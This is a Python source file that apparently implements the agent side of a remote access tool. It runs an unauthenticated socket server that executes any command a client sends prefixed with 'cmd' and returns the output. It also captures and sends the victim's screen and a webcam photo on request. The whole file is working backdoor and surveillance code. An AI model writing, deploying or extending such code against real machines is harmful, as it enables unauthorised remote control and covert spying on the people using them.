import socket 
import threading
import os
import pyautogui
import cv2 as cv
import subprocess

HEADER = 64 
PORT = 5000
SERVER = "127.0.0.1"
ADDR = (SERVER, PORT)
FORMAT = "utf-8"
DISCONNECTED_MESSAGE = "DISCONNECT"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


clients = []


def broadcast(msg: str):
    for client in clients:
        client.send(msg.encode(FORMAT))


def screenshot():
    pyautogui.screenshot("tempimage.png")


def cameraCapture():
    # Initalize OpenCV
    cam_port = 0
    cam = cv.VideoCapture(cam_port)

    result, image = cam.read()

    if result:
        cv.imwrite("tempcapture.png", image)
    else:
        print("No image detected. Please! try again")


def handleConnection(conn: socket, addr):
    print(f"{addr} has connected!")
    connected = True
    while connected:
        # Receive the header, then decode the message using the length of the message
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)
            if msg == DISCONNECTED_MESSAGE:
                print(f"{addr} has disconnected!")
                connected = False
                break
            else:
                if msg[:3] == "cmd":
                    print(f"Remote system running command: {msg[3:]}")
                    output = subprocess.getoutput(msg[3:])
                    msg_length = len(output)
                    msg_length = str(msg_length).encode(FORMAT)
                    # print(msg_length, output)
                    msg_length += b" " * (HEADER - len(msg_length))
                    # print(msg_length)
                    conn.send(msg_length)
                    conn.send(output.encode(FORMAT))
                elif msg == "screenshot":
                    screenshot()
                    temp = open("tempimage.png", "rb")
                    size = os.path.getsize("tempimage.png")
                    conn.send(str(size).encode(FORMAT))
                    data = temp.read()
                    conn.sendall(data)
                elif msg == "capture":
                    cameraCapture()
                    f = open("tempcapture.png", "rb")
                    size = os.path.getsize("tempcapture.png")
                    conn.send(str(size).encode(FORMAT))
                    data = f.read()
                    conn.sendall(data)


def main():
    print("Attempting to start server...")
    server.listen()
    print(f"Server listening on {ADDR}")  
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handleConnection, args=(conn, addr))
        thread.start()


if __name__ == "__main__":
    main()
